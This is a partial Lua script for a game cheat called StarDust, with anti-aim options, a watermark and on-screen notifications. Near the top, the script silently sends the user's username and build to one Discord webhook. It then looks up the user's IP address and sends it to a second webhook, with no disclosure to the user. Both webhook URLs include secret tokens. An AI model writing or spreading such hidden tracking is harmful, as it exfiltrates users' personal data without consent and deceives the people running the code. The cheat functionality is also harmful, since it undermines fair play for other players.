...
local Webhook = discord.new("https://discord.com/api/webhooks/1203800803010150431/RvE0XzOOHjjkjNNCqr029m1rdfVIqiCLl37fDhehRDor8O0rpeLknzttR5g-Jvj-9DLr")
local RichEmbed = discord.newEmbed()

Webhook:setUsername("StarDust.Dev")
RichEmbed:setTitle(":sos: lua has been loaded!")
Webhook:setAvatarURL("https://media.discordapp.net/attachments/1172939228771004416/1204093124343894027/red_star_PNG48.png")
RichEmbed:addField(":hammer_pick: lua build: ", celestia.build, true)
RichEmbed:addField(":bust_in_silhouette: username: ", celestia.username)
RichEmbed:addField(":link: lua:", "StarDust.Dev")
...
http.get('https://api.country.is/', function(s,r)
    if s and r.status == 200 then
        ...
        local Webhook = discord.new("https://discord.com/api/webhooks/1204137499199283220/HkSclV6n6ex8Ke2ti4IqtlNEU9gm9SgcghyBlp4Kr9D6ej7AYiuOi_Q4oAZ5IlJN9wH_")
        Webhook:send("New session has been **detected** : "..user_ip)
    end
end)
...
local watermark_mode = ui.new_combobox("AA", "Anti-aimbot angles", "Watermark", {"default", "modern"})
    ...
    ctx.notify = {
        ...
        render = function()
            ...
            for i, info_noti in ipairs(notify_data) do
                ...
                renderer.text(X /2 - width.x /2 - 20 + 5, Y - 200 - 100 + 31 * i * fraction + 4, color[1], color[2], color[3],255, 'b', 0, "stardust:")
    ...
    ctx.watermark = {
        render = function()
            if ui.get(watermark_mode) == "default" then
                ...
                renderer.text(X - (X-620), Y - 12, r, g, b, 255, "b", 0, text_fade_animation(3, color_r, color_g, color_b, 255, "-> S T A R D U S T <-") .. '\afa5757FF [ELIXIRIOUS]')
				renderer.text(X - (X-654), Y - 24, r, g, b, 255, "b", 0, text_fade_animation(1, color_r, color_g, color_b, 255, "USERNAME: ") .. celestia.username)
            end

            if ui.get(watermark_mode) == "modern" then
                ...
                local marginXdd, marginYyy = renderer.measure_text("b", string.upper(celestia.username))

                renderer.rectangle(X/2 - 370, Y - 31, 55 + marginXdd, 32, 70,66,94,255)
                renderer.rectangle(X/2 - 370, Y - 25, 30  + marginXdd, 32, 0,0,0,255)
                renderer.text(X/2 - 340 + marginXdd - marginXdd - 15,Y - 18, 255, 255, 255, 255, "b", nil, string.upper(celestia.username))
